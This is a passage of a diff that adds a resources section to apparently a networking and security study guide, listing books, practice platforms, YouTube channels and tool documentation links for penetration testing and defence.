+Detection          → Sigma rules + Sysmon + SIEM
+```
+
+## 44.4 Resources
+
+```
+Books:
+- "The TCP/IP Guide" by Charles M. Kozierok (Bible of networking)
+- "Hacking: The Art of Exploitation" by Jon Erickson
+- "Penetration Testing" by Georgia Weidman
+- "Red Team Field Manual" (RTFM)
+- "The Hacker Playbook 3" by Peter Kim
+- "Network Security Assessment" by Chris McNab
+
+Online:
+- TryHackMe: https://tryhackme.com
+- HackTheBox: https://hackthebox.com
+- OverTheWire: https://overthewire.org (Bandit → Natas → ...)
+- PentesterLab: https://pentesterlab.com
+- CyberDefenders: https://cyberdefenders.org (Blue team)
+- VulnHub: https://vulnhub.com
+- PortSwigger Web Academy: https://portswigger.net/web-security
+
+YouTube:
+- NetworkChuck
+- David Bombal
+- IppSec (HackTheBox walkthroughs)
+- John Hammond
+- The Cyber Mentor
+
+Tools Documentation:
+- Nmap: https://nmap.org/book/
+- Wireshark: https://www.wireshark.org/docs/
+- Metasploit: https://docs.metasploit.com/
+- Burp Suite: https://portswigger.net/web-security
+- MITRE ATT&CK: https://attack.mitre.org/
 ```
 
 ---
